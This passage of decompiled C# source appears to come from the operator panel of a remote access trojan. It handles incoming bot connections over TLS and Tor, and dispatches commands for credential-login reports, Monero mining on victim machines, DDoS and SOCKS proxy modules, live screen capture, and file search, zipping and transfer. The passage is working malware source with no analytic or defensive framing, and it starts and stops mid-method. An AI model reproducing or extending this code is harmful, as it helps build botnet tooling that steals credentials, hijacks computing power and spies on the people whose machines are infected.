					if (Operators.CompareString(left, "crd_logins_report", true) == 0)
					{
						string sKey7 = cclient_1.sKey;
						string text5 = Conversions.ToString(gclass.Items[i].Tag);
						long long_ = (long)Math.Round(Conversion.Val(gclass.Items[i].SubItems[2].Text));
						string_16 = text5;
						string_17 = sKey7;
						@class = new Class136.Class138();
						@class.string_0 = string_17;
						@class.string_1 = string_16;
						@class.long_0 = long_;
						try
						{
							if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
							{
								new Thread(new ThreadStart(@class._Lambda$__0)).Start();
							}
						}
						catch (Exception ex7)
						{
						}
						gclass.Items[i].SubItems[3].Text = Conversions.ToString(unchecked(Conversion.Val(gclass.Items[i].SubItems[3].Text) + 1.0));
						goto IL_E97;
					}
					if (Operators.CompareString(left, "crd_logins_report_req", true) == 0)
					{
						string sKey8 = cclient_1.sKey;
						string text6 = Conversions.ToString(gclass.Items[i].Tag);
						long long_ = (long)Math.Round(Conversion.Val(gclass.Items[i].SubItems[2].Text));
						string_16 = text6;
						string_17 = sKey8;
						@class = new Class136.Class138();
						@class.string_0 = string_17;
						@class.string_1 = string_16;
						@class.long_0 = long_;
						try
						{
							if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
							{
								new Thread(new ThreadStart(@class._Lambda$__0)).Start();
							}
						}
						catch (Exception ex8)
						{
						}
						gclass.Items[i].SubItems[3].Text = Conversions.ToString(unchecked(Conversion.Val(gclass.Items[i].SubItems[3].Text) + 1.0));
						goto IL_E97;
					}
					if (Operators.CompareString(left, "xmr64_mine_start", true) == 0)
					{
						string text7 = string.Empty;
						int num2 = array.Length - 1;
						for (int j = 1; j <= num2; j++)
						{
							text7 = Conversions.ToString(Operators.ConcatenateObject(text7, Operators.ConcatenateObject(array[j], Interaction.IIf(j < array.Length - 1, "|", string.Empty))));
						}
						cclient_1.MINER_LAST_SETTINGS = text7;
						string sKey9 = cclient_1.sKey;
						string text8 = Conversions.ToString(gclass.Items[i].Tag);
						long long_ = (long)Math.Round(Conversion.Val(gclass.Items[i].SubItems[2].Text));
						string_16 = text8;
						string_17 = sKey9;
						@class = new Class136.Class138();
						@class.string_0 = string_17;
						@class.string_1 = string_16;
						@class.long_0 = long_;
						try
						{
							if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
							{
								new Thread(new ThreadStart(@class._Lambda$__0)).Start();
							}
						}
						catch (Exception ex9)
						{
						}
						gclass.Items[i].SubItems[3].Text = Conversions.ToString(unchecked(Conversion.Val(gclass.Items[i].SubItems[3].Text) + 1.0));
						goto IL_E97;
					}
					if (Operators.CompareString(left, "xmr64_mine_req", true) == 0)
					{
						string text9 = string.Empty;
						int num3 = array.Length - 1;
						for (int k = 1; k <= num3; k++)
						{
							text9 = Conversions.ToString(Operators.ConcatenateObject(text9, Operators.ConcatenateObject(array[k], Interaction.IIf(k < array.Length - 1, "|", string.Empty))));
						}
						cclient_1.MINER_LAST_SETTINGS = text9;
						string sKey10 = cclient_1.sKey;
						string text10 = string.Concat(new string[]
						{
							array[0],
							"|",
							array[1],
							"|",
							array[3]
						});
						long long_ = (long)Math.Round(Conversion.Val(gclass.Items[i].SubItems[2].Text));
						string_16 = text10;
						string_17 = sKey10;
						@class = new Class136.Class138();
						@class.string_0 = string_17;
						@class.string_1 = string_16;
						@class.long_0 = long_;
						try
						{
							if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
							{
								new Thread(new ThreadStart(@class._Lambda$__0)).Start();
							}
						}
						catch (Exception ex10)
						{
						}
						gclass.Items[i].SubItems[3].Text = Conversions.ToString(unchecked(Conversion.Val(gclass.Items[i].SubItems[3].Text) + 1.0));
						goto IL_E97;
					}
					goto IL_E97;
				}
				gclass = null;
			}
		}
	}

	// Token: 0x06001376 RID: 4982 RVA: 0x0008C0F8 File Offset: 0x0008A2F8
	public void method_21(ref ConcurrentStack<CClient> concurrentStack_3)
	{
		if (this.vmethod_18().InvokeRequired)
		{
			this.vmethod_18().Invoke(new fMain.Delegate140(this.method_21), new object[]
			{
				concurrentStack_3
			});
			return;
		}
		checked
		{
			int num = concurrentStack_3.Count - 1;
			for (int i = 0; i <= num; i++)
			{
				if (Class130.concurrentDictionary_4.ContainsKey(concurrentStack_3.ElementAtOrDefault(i).sKey))
				{
					Class130.fMinerXMR_0.method_2(concurrentStack_3.ElementAtOrDefault(i).sKey);
				}
				if (Class130.concurrentDictionary_5.ContainsKey(concurrentStack_3.ElementAtOrDefault(i).sKey))
				{
					Class130.fDDOS_0.method_2(concurrentStack_3.ElementAtOrDefault(i).sKey);
				}
				if (Class130.concurrentDictionary_6.ContainsKey(concurrentStack_3.ElementAtOrDefault(i).sKey))
				{
					Class130.fSocks5_0.method_2(concurrentStack_3.ElementAtOrDefault(i).sKey);
				}
				if (Class130.concurrentDictionary_7.ContainsKey(concurrentStack_3.ElementAtOrDefault(i).sKey))
				{
					Class130.fSocks4R_0.method_1(concurrentStack_3.ElementAtOrDefault(i).sKey);
				}
				this.method_22(ref concurrentStack_3.ElementAtOrDefault(i).sKey, true);
			}
			this.vmethod_18().RemoveObjects(concurrentStack_3.ToList<CClient>());
		}
	}

	// Token: 0x06001377 RID: 4983 RVA: 0x0008C238 File Offset: 0x0008A438
	public void method_22(ref string string_0, bool bool_0)
	{
		try
		{
			if (this.vmethod_18().InvokeRequired)
			{
				this.vmethod_18().Invoke(new fMain.Delegate129(this.method_22), new object[]
				{
					string_0,
					bool_0
				});
			}
			else
			{
				try
				{
					try
					{
						if (Class130.concurrentDictionary_3[string_0].fDB != null)
						{
							Class130.concurrentDictionary_3[string_0].fDB.method_0();
						}
					}
					catch (Exception ex)
					{
					}
					try
					{
						foreach (KeyValuePair<string, CClient> keyValuePair in Class130.concurrentDictionary_3)
						{
							if (Class130.concurrentDictionary_3[keyValuePair.Key].FILE_TRANSFER_ACTIVE & Operators.CompareString(Class130.concurrentDictionary_3[keyValuePair.Key].FILE_TRANSFER_USER_KEY, string_0, true) == 0)
							{
								CClient value = keyValuePair.Value;
								bool flag = true;
								value.SOCKET_DISCONNECT(ref flag);
								CClient cclient = null;
								Class130.concurrentDictionary_3.TryRemove(keyValuePair.Value.sKey, out cclient);
							}
						}
					}
					finally
					{
						IEnumerator<KeyValuePair<string, CClient>> enumerator;
						if (enumerator != null)
						{
							enumerator.Dispose();
						}
					}
					CClient cclient2 = null;
					Class130.concurrentDictionary_3.TryRemove(string_0, out cclient2);
				}
				catch (Exception ex2)
				{
				}
			}
		}
		catch (Exception ex3)
		{
		}
	}

	// Token: 0x06001378 RID: 4984 RVA: 0x0008C3E4 File Offset: 0x0008A5E4
	public void method_23(ref string string_0)
	{
		checked
		{
			try
			{
				if (this.vmethod_18().InvokeRequired)
				{
					this.vmethod_18().Invoke(new fMain.Delegate148(this.method_23), new object[]
					{
						string_0
					});
				}
				else
				{
					this.vmethod_18().Items[string_0].BackColor = Color.Yellow;
					int num = this.vmethod_18().Items[string_0].SubItems.Count - 1;
					for (int i = 0; i <= num; i++)
					{
						this.vmethod_18().Items[string_0].SubItems[i].BackColor = Color.Yellow;
					}
				}
			}
			catch (Exception ex)
			{
			}
		}
	}

	// Token: 0x06001379 RID: 4985 RVA: 0x0008C4B4 File Offset: 0x0008A6B4
	public void method_24(ref object object_0)
	{
		if (Class130.concurrentDictionary_3.ContainsKey(Conversions.ToString(object_0)))
		{
			try
			{
				if (this.vmethod_18().InvokeRequired)
				{
					this.vmethod_18().Invoke(new fMain.Delegate118(delegate(ref string string_0)
					{
						object value = string_0;
						this.method_24(ref value);
						string_0 = Conversions.ToString(value);
					}), new object[]
					{
						object_0
					});
				}
				else
				{
					CClient cclient = Class130.concurrentDictionary_3[Conversions.ToString(object_0)];
					Class136.Struct27 @struct = default(Class136.Struct27);
					@struct.int_0 = Marshal.SizeOf(typeof(Class136.Struct27));
					bool flag = false;
					if (Class136.GetVersionExA(ref @struct) && @struct.int_1 >= 6)
					{
						flag = true;
					}
					long num;
					if (flag)
					{
						num = Class136.GetTickCount64();
					}
					else
					{
						num = (long)Class136.GetTickCount();
					}
					long lLastSignal = num;
					cclient.lLastSignal = lLastSignal;
					Class130.concurrentDictionary_3[Conversions.ToString(object_0)].pending_dc = false;
					Class130.concurrentDictionary_3[Conversions.ToString(object_0)].pending_dc_timeout = false;
				}
			}
			catch (Exception ex)
			{
			}
		}
	}

	// Token: 0x0600137A RID: 4986 RVA: 0x0008C5BC File Offset: 0x0008A7BC
	private void method_25()
	{
		if (base.InvokeRequired)
		{
			base.Invoke(new fMain.Delegate145(this.method_25), new object[0]);
			return;
		}
		if (Class130.fSettings_0.Visible)
		{
			Class130.fSettings_0.TopMost = false;
		}
		Class130.fCertificate_0.Visible = true;
		Form fCertificate_ = Class130.fCertificate_0;
		bool flag = false;
		Form form = fCertificate_;
		Rectangle rectangle;
		if (this != null)
		{
			rectangle = this.RectangleToScreen(this.ClientRectangle);
		}
		else
		{
			rectangle = Screen.FromPoint(form.Location).WorkingArea;
		}
		checked
		{
			int x = rectangle.Left + (rectangle.Width - form.Width) / 2;
			int y = rectangle.Top + (rectangle.Height - form.Height) / 2;
			form.Location = new Point(x, y);
			if (flag)
			{
				form.Visible = true;
			}
			Class130.fCertificate_0.Opacity = 100.0;
			Class130.fCertificate_0.Activate();
			Class130.fCertificate_0.method_0();
		}
	}

	// Token: 0x0600137B RID: 4987 RVA: 0x0008C6B0 File Offset: 0x0008A8B0
	public void method_26(ref int int_1, ref string string_0)
	{
		if (!Class130.struct18_0.method_0())
		{
			MySettings mySettings;
			object password = (mySettings = Class135.smethod_0()).Password;
			ref object ptr = ref password;
			object obj = Strings.Len(RuntimeHelpers.GetObjectValue(ptr)) > 0 & Strings.Len(RuntimeHelpers.GetObjectValue(ptr)) <= 16;
			object operand = obj;
			mySettings.Password = Conversions.ToString(password);
			if (!Conversions.ToBoolean(Operators.NotObject(operand)) && !(int_1 < 1 | int_1 > 65535))
			{
				Class130.fSettings_0.method_51(false);
				if (Class136.smethod_7("127.0.0.1", int_1))
				{
					Interaction.MsgBox("The main port (SSL) " + Conversions.ToString(int_1) + " is already in use!", MsgBoxStyle.Critical, Application.ProductName);
					Class130.fSettings_0.method_51(true);
					return;
				}
				try
				{
					if (Class144.smethod_2() && !Class144.smethod_3(Application.ExecutablePath))
					{
						Class144.smethod_4("Unknown", Application.ExecutablePath);
					}
				}
				catch (Exception ex)
				{
				}
				Class130.int_0 = int_1;
				Class130.struct7_0.method_1(300000L);
				if (this.vmethod_0() == null)
				{
					this.vmethod_1(new GClass5(int_1, true));
				}
				if (Operators.CompareString(string_0, null, true) == 0)
				{
					try
					{
						Class130.ipaddress_0 = IPAddress.Any;
						goto IL_16E;
					}
					catch (Exception ex2)
					{
						goto IL_16E;
					}
				}
				try
				{
					Class130.ipaddress_0 = IPAddress.Parse(string_0);
				}
				catch (Exception ex3)
				{
				}
				IL_16E:
				this.thread_1 = new Thread(new ThreadStart(this.method_36));
				this.thread_1.Start();
				Class130.struct18_0.method_1(true);
				Class130.fSettings_0.method_51(true);
				if (Class130.struct18_0.method_0() & Class130.struct18_1.method_0())
				{
					this.vmethod_8().Text = "Ports: " + Conversions.ToString(int_1) + "," + Conversions.ToString(Class135.smethod_0().PortTor);
				}
				else
				{
					this.vmethod_8().Text = "Port: " + Conversions.ToString(int_1);
				}
				string text = "Listening for connections";
				this.method_39(ref text);
			}
		}
	}

	// Token: 0x0600137C RID: 4988 RVA: 0x0008C900 File Offset: 0x0008AB00
	public void method_27()
	{
		if (this.vmethod_18().InvokeRequired)
		{
			this.vmethod_18().Invoke(new fMain.Delegate116(this.method_27), new object[0]);
			return;
		}
		Class130.fSettings_0.method_51(false);
		try
		{
			this.thread_1.Abort();
			this.vmethod_0().method_7();
			this.vmethod_1(null);
			Class130.struct18_0.method_1(false);
			if (Class130.struct18_1.method_0())
			{
				this.vmethod_8().Text = "Port: " + Conversions.ToString(Class135.smethod_0().PortTor);
			}
			else
			{
				this.vmethod_8().Text = "Port: N/A";
			}
			ConcurrentStack<CClient> concurrentStack = new ConcurrentStack<CClient>();
			try
			{
				foreach (KeyValuePair<string, CClient> keyValuePair in Class130.concurrentDictionary_3)
				{
					if (keyValuePair.Value.IS_SSL)
					{
						CClient value = keyValuePair.Value;
						bool flag = true;
						value.SOCKET_DISCONNECT(ref flag);
						this.method_22(ref keyValuePair.Value.sKey, true);
						concurrentStack.Push(keyValuePair.Value);
						if (keyValuePair.Value.fDB != null)
						{
							keyValuePair.Value.fDB.method_0();
						}
					}
				}
			}
			finally
			{
				IEnumerator<KeyValuePair<string, CClient>> enumerator;
				if (enumerator != null)
				{
					enumerator.Dispose();
				}
			}
			this.vmethod_18().RemoveObjects(concurrentStack.ToList<CClient>());
			if (!Class130.struct18_1.method_0())
			{
				this.vmethod_18().ClearObjects();
				Class130.concurrentDictionary_3.Clear();
				if (Class130.concurrentDictionary_4.Count > 0)
				{
					Class130.fMinerXMR_0.vmethod_22().ClearObjects();
					Class130.concurrentDictionary_4.Clear();
				}
				if (Class130.concurrentDictionary_5.Count > 0)
				{
					Class130.fDDOS_0.vmethod_38().ClearObjects();
					Class130.concurrentDictionary_5.Clear();
				}
				if (Class130.concurrentDictionary_6.Count > 0)
				{
					Class130.fSocks5_0.vmethod_20().ClearObjects();
					Class130.concurrentDictionary_6.Clear();
				}
				if (Class130.concurrentDictionary_7.Count > 0)
				{
					Class130.fSocks4R_0.vmethod_48().ClearObjects();
					Class130.concurrentDictionary_7.Clear();
				}
			}
			if (!Class130.struct18_1.method_0() & !Class130.struct18_0.method_0())
			{
				string text = "Pending...";
				this.method_39(ref text);
			}
			else
			{
				string text = "Listening for connections";
				this.method_39(ref text);
			}
		}
		catch (Exception ex)
		{
		}
		Class130.fSettings_0.method_51(true);
	}

	// Token: 0x0600137D RID: 4989 RVA: 0x0008CB94 File Offset: 0x0008AD94
	public void method_28(ref int int_1, ref string string_0)
	{
		if (!Class130.struct18_1.method_0())
		{
			MySettings mySettings;
			object password = (mySettings = Class135.smethod_0()).Password;
			ref object ptr = ref password;
			object obj = Strings.Len(RuntimeHelpers.GetObjectValue(ptr)) > 0 & Strings.Len(RuntimeHelpers.GetObjectValue(ptr)) <= 16;
			object operand = obj;
			mySettings.Password = Conversions.ToString(password);
			if (!Conversions.ToBoolean(Operators.NotObject(operand)) && !(int_1 < 1 | int_1 > 65535))
			{
				Class130.fSettings_0.method_52(false);
				if (Class136.smethod_7("127.0.0.1", int_1))
				{
					Interaction.MsgBox("The Tor port " + Conversions.ToString(int_1) + " is already in use!", MsgBoxStyle.Critical, Application.ProductName);
					Class130.fSettings_0.method_52(true);
					return;
				}
				try
				{
					if (Class144.smethod_2() && !Class144.smethod_3(Application.ExecutablePath))
					{
						Class144.smethod_4("Unknown", Application.ExecutablePath);
					}
				}
				catch (Exception ex)
				{
				}
				Class130.int_1 = int_1;
				Class130.struct7_1.method_1(300000L);
				if (this.vmethod_2() == null)
				{
					this.vmethod_3(new GClass5(int_1, false));
				}
				if (Operators.CompareString(string_0, null, true) == 0)
				{
					try
					{
						Class130.ipaddress_0 = IPAddress.Any;
						goto IL_16E;
					}
					catch (Exception ex2)
					{
						goto IL_16E;
					}
				}
				try
				{
					Class130.ipaddress_0 = IPAddress.Parse(string_0);
				}
				catch (Exception ex3)
				{
				}
				IL_16E:
				this.thread_2 = new Thread(new ThreadStart(this.method_37));
				this.thread_2.Start();
				Class130.struct18_1.method_1(true);
				Class130.fSettings_0.method_52(true);
				if (Class130.struct18_0.method_0() & Class130.struct18_1.method_0())
				{
					this.vmethod_8().Text = "Ports: " + Conversions.ToString(Class135.smethod_0().PortMain) + "," + Conversions.ToString(int_1);
				}
				else
				{
					this.vmethod_8().Text = "Port: " + Conversions.ToString(int_1);
				}
				string text = "Listening for connections";
				this.method_39(ref text);
			}
		}
	}

	// Token: 0x0600137E RID: 4990 RVA: 0x0008CDE4 File Offset: 0x0008AFE4
	public void method_29()
	{
		if (this.vmethod_18().InvokeRequired)
		{
			this.vmethod_18().Invoke(new fMain.Delegate134(this.method_29), new object[0]);
			return;
		}
		Class130.fSettings_0.method_52(false);
		try
		{
			this.thread_2.Abort();
			this.vmethod_2().method_7();
			this.vmethod_3(null);
			Class130.struct18_1.method_1(false);
			if (Class130.struct18_0.method_0())
			{
				this.vmethod_8().Text = "Port: " + Conversions.ToString(Class135.smethod_0().PortMain);
			}
			else
			{
				this.vmethod_8().Text = "Port: N/A";
			}
			ConcurrentStack<CClient> concurrentStack = new ConcurrentStack<CClient>();
			try
			{
				foreach (KeyValuePair<string, CClient> keyValuePair in Class130.concurrentDictionary_3)
				{
					if (!keyValuePair.Value.IS_SSL)
					{
						CClient value = keyValuePair.Value;
						bool flag = true;
						value.SOCKET_DISCONNECT(ref flag);
						this.method_22(ref keyValuePair.Value.sKey, true);
						concurrentStack.Push(keyValuePair.Value);
						if (keyValuePair.Value.fDB != null)
						{
							keyValuePair.Value.fDB.method_0();
						}
					}
				}
			}
			finally
			{
				IEnumerator<KeyValuePair<string, CClient>> enumerator;
				if (enumerator != null)
				{
					enumerator.Dispose();
				}
			}
			this.vmethod_18().RemoveObjects(concurrentStack.ToList<CClient>());
			if (!Class130.struct18_0.method_0())
			{
				this.vmethod_18().ClearObjects();
				Class130.concurrentDictionary_3.Clear();
				if (Class130.concurrentDictionary_4.Count > 0)
				{
					Class130.fMinerXMR_0.vmethod_22().ClearObjects();
					Class130.concurrentDictionary_4.Clear();
				}
				if (Class130.concurrentDictionary_5.Count > 0)
				{
					Class130.fDDOS_0.vmethod_38().ClearObjects();
					Class130.concurrentDictionary_5.Clear();
				}
				if (Class130.concurrentDictionary_6.Count > 0)
				{
					Class130.fSocks5_0.vmethod_20().ClearObjects();
					Class130.concurrentDictionary_6.Clear();
				}
				if (Class130.concurrentDictionary_7.Count > 0)
				{
					Class130.fSocks4R_0.vmethod_48().ClearObjects();
					Class130.concurrentDictionary_7.Clear();
				}
			}
			if (!Class130.struct18_1.method_0() & !Class130.struct18_0.method_0())
			{
				string text = "Pending...";
				this.method_39(ref text);
			}
			else
			{
				string text = "Listening for connections";
				this.method_39(ref text);
			}
		}
		catch (Exception ex)
		{
		}
		Class130.fSettings_0.method_52(true);
	}

	// Token: 0x0600137F RID: 4991 RVA: 0x0008D078 File Offset: 0x0008B278
	private void method_30(string string_0)
	{
		fMain fMain = this;
		CClient cclient = new CClient(ref fMain, string_0, this.vmethod_0().method_10(string_0), true);
		if (Class130.concurrentDictionary_3.TryAdd(cclient.sKey, cclient))
		{
			IPEndPoint ipendPoint = (IPEndPoint)Class130.concurrentDictionary_3[string_0].sock_async.socket_0.LocalEndPoint;
			Class130.fConnectionLog_0.method_1(Class130.concurrentDictionary_3[string_0].sIP + ":" + Class130.concurrentDictionary_3[string_0].sPort, Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Interaction.IIf(Class130.concurrentDictionary_3[string_0].IS_SSL, "TLS 1.2", "Tor"), ", src: "), ipendPoint.Port)), 1);
		}
	}

	// Token: 0x06001380 RID: 4992 RVA: 0x0008D148 File Offset: 0x0008B348
	private void method_31(string string_0, string string_1, string string_2, bool bool_0)
	{
		Class130.fConnectionLog_0.method_1(string_1 + ":" + string_2, Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Interaction.IIf(bool_0, "TLS 1.2", "Tor"), ", src: "), string_2)), 2);
		if (Class130.concurrentDictionary_3.ContainsKey(string_0) && !Class130.concurrentDictionary_3[string_0].FILE_TRANSFER_ISPAUSED)
		{
			CClient cclient = Class130.concurrentDictionary_3[string_0];
			bool flag = true;
			cclient.SOCKET_DISCONNECT(ref flag);
		}
	}

	// Token: 0x06001381 RID: 4993 RVA: 0x0008D1C8 File Offset: 0x0008B3C8
	private void method_32(string string_0, byte[] byte_0)
	{
		if (Class130.concurrentDictionary_3.ContainsKey(string_0))
		{
			CClient cclient = Class130.concurrentDictionary_3[string_0];
			ref byte[] ptr = ref byte_0;
			CClient cclient2 = cclient;
			int num = ptr.Length;
			try
			{
				if (cclient2.SCREENLIVE_ACTIVE)
				{
					ref double ptr2 = ref Class130.struct20_0.double_2;
					Class130.struct20_0.double_2 = ptr2 + (double)num;
					ptr2 = ref Class130.struct20_0.double_4;
					Class130.struct20_0.double_4 = ptr2 + 1.0;
					CClient cclient3 = Class130.concurrentDictionary_3[cclient2.SCREENLIVE_USER_KEY];
					ptr2 = ref cclient3.stats_bytes_in;
					cclient3.stats_bytes_in = ptr2 + (double)num;
					cclient2.mPacket.Write(ptr, 0, num);
					checked
					{
						if (ptr.Length > 2 && (ptr[ptr.Length - 1] == 124 & ptr[ptr.Length - 2] == 124 & ptr[ptr.Length - 3] == 124))
						{
							cclient2.mPacket.SetLength(cclient2.mPacket.Length - 3L);
							CClient cclient4 = cclient2;
							try
							{
								if (!cclient4.IS_SSL)
								{
									cclient4.sock_async.socket_0.Send(Encoding.UTF8.GetBytes("1"));
								}
								Class130.concurrentDictionary_3[cclient4.SCREENLIVE_USER_KEY].fDB.vmethod_24().Image = Image.FromStream(new MemoryStream(cclient4.mPacket.ToArray()));
								Class130.concurrentDictionary_3[cclient4.SCREENLIVE_USER_KEY].SCREEN_FPS_UPDATE((double)cclient4.mPacket.Length);
								cclient4.mPacket.SetLength(0L);
							}
							catch (Exception ex)
							{
								cclient4.mPacket.SetLength(0L);
							}
						}
						return;
					}
				}
				if (cclient2.SOCKET_COMMAND_ACTIVE)
				{
					ref double ptr2 = ref Class130.struct20_0.double_2;
					Class130.struct20_0.double_2 = ptr2 + (double)num;
					ptr2 = ref Class130.struct20_0.double_4;
					Class130.struct20_0.double_4 = ptr2 + 1.0;
					CClient cclient5 = Class130.concurrentDictionary_3[cclient2.SOCKET_COMMAND_USER_KEY];
					ptr2 = ref cclient5.stats_bytes_in;
					cclient5.stats_bytes_in = ptr2 + (double)num;
					cclient2.mPacket.Write(ptr, 0, num);
					if (Encoding.UTF8.GetString(ptr, 0, num).EndsWith("@"))
					{
						CClient cclient6 = Class130.concurrentDictionary_3[cclient2.SOCKET_COMMAND_USER_KEY];
						string left = Encoding.UTF8.GetString(cclient2.mPacket.ToArray());
						ref string ptr3 = ref left;
						CClient cclient7 = cclient6;
						CClient.Class152 @class = new CClient.Class152();
						@class.cclient_0 = cclient7;
						checked
						{
							if (ptr3.EndsWith("@"))
							{
								ptr3 = ptr3.Remove(ptr3.Length - 1);
							}
							string[] array = Strings.Split(ptr3, "|", 4, CompareMethod.Text);
							fMain ff = cclient7.ff;
							CClient cclient8 = cclient7;
							long num2 = Class136.smethod_36();
							string[] array2 = array;
							int num3 = 1;
							ref string ptr4 = ref array2[num3];
							long value = Conversions.ToLong(array2[num3]);
							ff.method_19(ref cclient8, ref num2, ref value);
							ptr4 = Conversions.ToString(value);
							try
							{
								CClient.Class151 class2 = new CClient.Class151();
								class2.class152_0 = @class;
								class2.byte_0 = Convert.FromBase64String(array[3]);
								class2.class152_0.string_0 = Strings.Split(Encoding.UTF8.GetString(Convert.FromBase64String(array[3])), "|", -1, CompareMethod.Text);
								long num4 = Conversions.ToLong(array[2]);
								string left2 = Strings.LCase(array[0]);
								if (Operators.CompareString(left2, "cli_sleep", true) == 0)
								{
									if (Conversion.Val(class2.class152_0.string_0[0]) == 0.0)
									{
										cclient7.pending_dc = false;
										cclient7.pending_dc_timeout = false;
										cclient7.bJustConnected = false;
									}
								}
								else if (Operators.CompareString(left2, "cli_hib", true) == 0)
								{
									if (Conversion.Val(class2.class152_0.string_0[0]) == 0.0)
									{
										cclient7.pending_dc = false;
										cclient7.pending_dc_timeout = false;
										cclient7.bJustConnected = false;
									}
								}
								else if (Operators.CompareString(left2, "cli_log", true) == 0)
								{
									if (Conversion.Val(class2.class152_0.string_0[0]) == 0.0)
									{
										cclient7.pending_dc = false;
										cclient7.pending_dc_timeout = false;
										cclient7.bJustConnected = false;
									}
								}
								else if (Operators.CompareString(left2, "cli_rs", true) == 0)
								{
									if (Conversion.Val(class2.class152_0.string_0[0]) == 0.0)
									{
										cclient7.pending_dc = false;
										cclient7.pending_dc_timeout = false;
										cclient7.bJustConnected = false;
									}
								}
								else if (Operators.CompareString(left2, "cli_off", true) == 0)
								{
									if (Conversion.Val(class2.class152_0.string_0[0]) == 0.0)
									{
										cclient7.pending_dc = false;
										cclient7.pending_dc_timeout = false;
										cclient7.bJustConnected = false;
									}
								}
								else if (Operators.CompareString(left2, "con", true) == 0)
								{
									int num5 = class2.class152_0.string_0.Length;
									if (num5 != 15)
									{
										if (num5 == 16)
										{
											fMain ff2 = cclient7.ff;
											cclient8 = cclient7;
											ff2.method_20(ref cclient8, ref class2.class152_0.string_0[0], ref class2.class152_0.string_0[1], ref class2.class152_0.string_0[2], ref class2.class152_0.string_0[3], ref class2.class152_0.string_0[4], ref class2.class152_0.string_0[5], ref class2.class152_0.string_0[6], ref class2.class152_0.string_0[7], ref class2.class152_0.string_0[8], ref class2.class152_0.string_0[9], ref class2.class152_0.string_0[10], ref class2.class152_0.string_0[11], ref class2.class152_0.string_0[12], ref class2.class152_0.string_0[13], ref class2.class152_0.string_0[14], ref class2.class152_0.string_0[15]);
										}
									}
									else
									{
										fMain ff3 = cclient7.ff;
										cclient8 = cclient7;
										string[] string_ = class2.class152_0.string_0;
										int num6 = 0;
										string[] string_2 = class2.class152_0.string_0;
										int num7 = 1;
										string[] string_3 = class2.class152_0.string_0;
										int num8 = 2;
										string[] string_4 = class2.class152_0.string_0;
										int num9 = 3;
										string[] string_5 = class2.class152_0.string_0;
										int num10 = 4;
										string[] string_6 = class2.class152_0.string_0;
										int num11 = 5;
										string[] string_7 = class2.class152_0.string_0;
										int num12 = 6;
										string[] string_8 = class2.class152_0.string_0;
										int num13 = 7;
										string[] string_9 = class2.class152_0.string_0;
										int num14 = 8;
										string[] string_10 = class2.class152_0.string_0;
										int num15 = 9;
										string[] string_11 = class2.class152_0.string_0;
										int num16 = 10;
										string[] string_12 = class2.class152_0.string_0;
										int num17 = 11;
										string[] string_13 = class2.class152_0.string_0;
										int num18 = 12;
										string[] string_14 = class2.class152_0.string_0;
										int num19 = 13;
										string[] string_15 = class2.class152_0.string_0;
										int num20 = 14;
										string text = "Default";
										ff3.method_20(ref cclient8, ref string_[num6], ref string_2[num7], ref string_3[num8], ref string_4[num9], ref string_5[num10], ref string_6[num11], ref string_7[num12], ref string_8[num13], ref string_9[num14], ref string_10[num15], ref string_11[num16], ref string_12[num17], ref string_13[num18], ref string_14[num19], ref string_15[num20], ref text);
									}
								}
								else if (Operators.CompareString(left2, "info", true) == 0)
								{
									if (cclient7.fDB == null)
									{
										CClient cclient9 = cclient7;
										bool flag = true;
										cclient9.SOCKET_DISCONNECT(ref flag);
										goto IL_23A3;
									}
									new Thread(new ThreadStart(class2.class152_0._Lambda$__0)).Start();
								}
								else if (Operators.CompareString(left2, "drives_get", true) == 0)
								{
									if (cclient7.fDB == null)
									{
										CClient cclient10 = cclient7;
										bool flag = true;
										cclient10.SOCKET_DISCONNECT(ref flag);
										goto IL_23A3;
									}
									new Thread(new ThreadStart(class2.class152_0._Lambda$__1)).Start();
								}
								else if (Operators.CompareString(left2, "files_get", true) == 0)
								{
									if (cclient7.fDB == null)
									{
										CClient cclient11 = cclient7;
										bool flag = true;
										cclient11.SOCKET_DISCONNECT(ref flag);
										goto IL_23A3;
									}
									new Thread(new ThreadStart(class2.class152_0._Lambda$__2)).Start();
								}
								else if (Operators.CompareString(left2, "files_search", true) == 0)
								{
									if (cclient7.fDB == null)
									{
										CClient cclient12 = cclient7;
										bool flag = true;
										cclient12.SOCKET_DISCONNECT(ref flag);
										goto IL_23A3;
									}
									cclient7.fSrch.method_3(class2.class152_0.string_0[0], class2.class152_0.string_0[1], class2.class152_0.string_0[2], class2.class152_0.string_0[3], class2.class152_0.string_0[4], class2.class152_0.string_0[5], string.Empty, string.Empty);
								}
								else if (Operators.CompareString(left2, "files_search_error_start", true) == 0)
								{
									if (cclient7.fDB == null)
									{
										CClient cclient13 = cclient7;
										bool flag = true;
										cclient13.SOCKET_DISCONNECT(ref flag);
										goto IL_23A3;
									}
									cclient7.fSrch.method_2(class2.class152_0.string_0[0]);
								}
								else if (Operators.CompareString(left2, "files_search_error_file", true) == 0)
								{
									if (cclient7.fDB == null)
									{
										CClient cclient14 = cclient7;
										bool flag = true;
										cclient14.SOCKET_DISCONNECT(ref flag);
										goto IL_23A3;
									}
									cclient7.fSrch.method_3(class2.class152_0.string_0[0], class2.class152_0.string_0[1], class2.class152_0.string_0[2], "N/A", class2.class152_0.string_0[3], "N/A", string.Empty, class2.class152_0.string_0[4]);
								}
								else if (Operators.CompareString(left2, "files_search_path", true) == 0)
								{
									if (cclient7.fDB == null)
									{
										CClient cclient15 = cclient7;
										bool flag = true;
										cclient15.SOCKET_DISCONNECT(ref flag);
										goto IL_23A3;
									}
									cclient7.fSrch.method_8(class2.class152_0.string_0[0]);
									cclient7.fSrch.method_1(class2.class152_0.string_0[1]);
								}
								else if (Operators.CompareString(left2, "files_search_done", true) == 0)
								{
									if (cclient7.fDB == null)
									{
										CClient cclient16 = cclient7;
										bool flag = true;
										cclient16.SOCKET_DISCONNECT(ref flag);
										goto IL_23A3;
									}
									cclient7.fSrch.method_5(true, class2.class152_0.string_0[0]);
								}
								else if (Operators.CompareString(left2, "files_zip_start", true) == 0)
								{
									if (cclient7.fDB == null)
									{
										CClient cclient17 = cclient7;
										bool flag = true;
										cclient17.SOCKET_DISCONNECT(ref flag);
										goto IL_23A3;
									}
									new Thread(new ThreadStart(class2.class152_0._Lambda$__3)).Start();
								}
								else if (Operators.CompareString(left2, "files_zip", true) == 0)
								{
									if (cclient7.fDB == null)
									{
										CClient cclient18 = cclient7;
										bool flag = true;
